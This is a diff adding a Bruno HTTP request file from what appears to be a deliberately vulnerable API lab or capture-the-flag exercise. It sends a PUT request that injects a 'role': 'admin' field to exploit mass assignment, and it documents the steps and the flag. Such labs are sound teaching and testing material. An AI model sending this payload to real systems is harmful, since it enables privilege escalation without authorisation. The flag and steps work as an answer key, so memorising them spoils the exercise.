@@ -1,0 +1,38 @@
+meta {
+  name: V05 Mass Assignment - Escalate to Admin
+  type: http
+  seq: 3
+}
+
+put {
+  url: {{baseUrl}}/api/users/2
+  body: json
+  auth: bearer
+}
+
+auth:bearer {
+  token: {{token}}
+}
+
+body:json {
+  {
+    "username": "john",
+    "email": "john@example.com",
+    "role": "admin"
+  }
+}
+
+docs {
+  # V05: Mass Assignment
+
+  ## Vulnerability
+  API accepts fields that shouldn't be user-modifiable.
+
+  ## Exploit
+  1. Login as john (normal user)
+  2. Update profile with extra "role": "admin"
+  3. Become admin!
+
+  ## Flag
+  VULNAPI{mass_assignment_privilege_escalation}
+}
